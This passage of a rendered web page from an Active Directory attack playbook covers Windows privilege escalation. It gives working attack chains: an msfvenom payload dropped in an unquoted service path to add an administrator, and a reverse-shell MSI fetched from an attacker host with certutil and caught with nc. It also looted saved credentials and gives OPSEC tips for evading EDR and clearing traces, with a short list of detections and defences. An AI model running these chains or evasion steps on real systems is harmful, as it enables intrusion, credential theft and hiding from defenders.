+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="c"># 3) Drop payload in the gap</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s1">&#39;net localgroup administrators bob /add&#39;</span> <span class="p">\</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>  <span class="o">-f</span> <span class="n">exe</span> <span class="n">-o</span> <span class="n">Vendor</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="nb">copy </span><span class="n">Vendor</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;C:\Program Files\Vendor.exe&quot;</span>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="c"># 4) Wait for service restart (or trigger it if you have permission)</span>
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="nb">sc </span><span class="n">stop</span> <span class="n">VulnSvc</span><span class="p">;</span> <span class="nb">sc start </span><span class="n">VulnSvc</span>
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="c"># 5) Confirm</span>
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="c"># → bob is now an admin</span>
+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="c"># 6) Re-login to get an admin token, then loot cmdkey</span>
+</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="c"># → DOMAIN\svc_backup (saved)</span>
+</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">\</span><span class="n">svc_backup</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&quot;cmd.exe /k whoami&quot;</span>
+</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a>
+</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="c"># 7) Cleanup</span>
+</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="nb">del </span><span class="s2">&quot;C:\Program Files\Vendor.exe&quot;</span>
+</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">bob</span> <span class="p">/</span><span class="n">delete</span>
+</span></code></pre></div>
+</div>
+<div class="admonition example">
+<p class="admonition-title">Chain C: AlwaysInstallElevated → SYSTEM</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c"># 1) Confirm both keys (requires both)</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c"># Both → 0x1</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c"># 2) Build the MSI on attacker</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4444</span> <span class="p">\</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>  <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">pwn</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="c"># 3) Transfer + install</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;/</span><span class="n">pwn</span><span class="p">.</span><span class="n">msi</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">pwn</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">pwn</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="c"># 4) Catch SYSTEM shell</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">4444</span>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="c"># whoami → nt authority\system</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="c"># 5) Cleanup</span>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">x</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">pwn</span><span class="p">.</span><span class="n">msi</span> <span class="p">/</span><span class="n">quiet</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="nb">del </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">pwn</span><span class="p">.</span><span class="n">msi</span>
+</span></code></pre></div>
+</div>
+<h3 id="126-opsec-detection-defenses">12.6 · OPSEC, detection, defenses<a class="headerlink" href="#126-opsec-detection-defenses" title="Permanent link">¶</a></h3>
+<div class="admonition danger">
+<p class="admonition-title">What defenders see when you privesc</p>
+<ul>
+<li><strong>Sysmon EID 1</strong> for Potato binaries, msiexec installs from non-standard paths, sc config changes, cmd-spawn-cmd chains</li>
+<li><strong>EID 4673/4674</strong> for sensitive privilege use (SeImpersonate, SeDebug, SeBackup) — rare in clean envs, very high signal</li>
+<li><strong>EID 4697</strong> for service installation; <strong>EID 7045</strong> in System log</li>
+<li><strong>EID 4720</strong> account creation, <strong>EID 4732</strong> local admin group add — your <code>net user / net localgroup</code> lands here</li>
+<li>LSASS process access (EID 10 from Sysmon) with <code>GrantedAccess = 0x1010</code> is the classic mimikatz/procdump pattern</li>
+<li>Defender ASR rules: "Block credential stealing from LSASS" catches procdump on default-config endpoints</li>
+<li>EDR catches: parent-child anomalies (<code>w3wp.exe</code> → <code>cmd.exe</code> → <code>gp.exe</code> is screaming at every modern EDR)</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">OPSEC playbook</p>
+<ul>
+<li>Rename Potato binaries; better, rebuild from source with strings/symbols stripped</li>
+<li>Prefer in-memory execution (<code>execute-assembly</code>, <code>Invoke-ReflectivePEInjection</code>) over disk drops where the C2 supports it</li>
+<li>Use built-ins where possible: <code>comsvcs.dll MiniDump</code> over procdump for LSASS, <code>wmic</code> over custom binaries</li>
+<li>Keep payloads in <code>C:\Windows\Temp</code> or <code>C:\ProgramData</code> — these are universally writable and not unusual to see files in</li>
+<li>Always <code>del</code> your stagers + clear the relevant logs entries you can (event log clearing itself is loud — usually better to leave noise than to clear logs)</li>
+<li>Enumerate before exploiting: a noisy winpeas run from a service account is much less suspicious than a noisy potato that fails</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Defenses to recommend in the report</p>
+<ul>
+<li><strong>Patch + maintain a vuln-driver block list</strong> (<code>HVCI</code>, Microsoft's recommended block list) to neutralize SeLoadDriver</li>
+<li><strong>Disable Print Spooler</strong> on every server that isn't a print server — kills PrintSpoofer + half of the relay surface from #23</li>
+<li><strong>Set <code>AlwaysInstallElevated = 0</code></strong> via GPO across the estate; this is rarely needed legitimately</li>
+<li><strong>Audit and remove unquoted service paths</strong>: <code>Get-WmiObject win32_service | ? PathName -notlike '"*' -and PathName -like '* *'</code></li>
+<li><strong>Restrict <code>SeImpersonatePrivilege</code></strong> to just the service accounts that genuinely need it; harden default IIS/SQL service hardening guides</li>
+<li><strong>Enable Credential Guard</strong> (<code>HVCI</code> + VBS) to neutralize most LSASS dumping</li>
+<li><strong>WDAC / AppLocker</strong> to block unsigned binaries running from <code>C:\Windows\Temp</code>, <code>C:\ProgramData</code>, user-writable paths</li>
+<li><strong>Disable WDigest</strong> (<code>UseLogonCredential = 0</code>) so cleartext passwords don't sit in LSASS</li>
+<li><strong>Configure LAPS</strong> so local admin hashes aren't reused across the estate (kills the pass-the-hash spread from #12.3)</li>
+</ul>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../11-lateral-movement/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 11· Lateral Movement">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                11· Lateral Movement
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../13-domain-dominance-dcsync-golden-silver/" class="md-footer__link md-footer__link--next" aria-label="Next: 13· Domain Dominance (DCSync, Golden, Silver)">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                13· Domain Dominance (DCSync, Golden, Silver)
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      For authorized security testing only.
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/SowatKheang/ad_attack_playbook" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.action.edit", "content.tabs.link"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
